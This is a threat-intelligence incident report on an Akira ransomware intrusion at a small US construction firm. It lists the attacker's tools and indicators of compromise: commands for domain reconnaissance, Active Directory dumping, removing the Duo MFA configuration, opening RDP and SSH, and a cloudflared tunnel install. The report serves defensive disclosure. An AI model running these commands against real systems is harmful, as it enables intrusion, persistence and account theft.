# Community Report 009 - Akira August 2025 

### Contributor Details
```
- Real Name: Ben Folland
- Online Handle: @polygonben
- Employer: Huntress
```
---
### Adversary
```
- Named adversary: Akira
```
---
### Incident Details
```
- Time of Incident: August 2025
- Victim Sector: Construction
- Victim Country: USA
- Victom Size: 1-100
```
---
### Observed Tools
 
| Discovery | RMM Tools | Defense Evasion | Credential Theft | OffSec | Networking | LOLBAS | Exfiltration |
|---|---|---|---|---|---|---|---|
|   |   |   |   | Impacket  | Cloudflared  | net   |   |
|   |   |   |   |   | OpenSSH  | netsh  |   |
|   |   |   |   |   |   | nltest  |   |
---
### Indicators of Compromise (IOCs)
```
Powershell History:

New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
cmd
nltest /dclist:
nltest /trusted_domains
net group /domain "Domain Admins"
clsssss
cls
Install-WindowsFeature RSAT-AD-PowerShell
Get-ADUser -Filter * -Properties * | Select-Object distinguishedName, Enabled, CanonicalName, CN, Name, SamAccountName, MemberOf, Company, Title, Description, Created, Modified, PasswordLastSet, LastLogonDate, logonCount, Department, telephoneNumber, MobilePhone, OfficePhone, EmailAddress, mail, HomeDirectory, homeMDB > C:\programdata\adu.txt
Get-ADComputer -Filter * -Property * | Select-Object Enabled, DNSHostName, IPv4Address, OperatingSystem, Description  > C:\programdata\adc_light2.txt:

Command Line / Process Tree:

- WmiPrvSE.exe // Impacket wmiexec lateral movement to run:
  -  Remove-Item -Path "HKLM:\Software\Duo Security" -Recurse -Force
  -  netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
  -  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

- 	C:\ProgramData\ssh\cloudflared.exe service install eyJ[...REDACTED...]SJ9 // Known Akira Cloudflared token

Staging:
- C:\ProgramData\

Ransomware Binary:
- N/A
```
---
#### Any Related Sources
| Date Published | Report |
|---|---|
| 04/08/2025 | https://www.huntress.com/blog/exploitation-of-sonicwall-vpn |
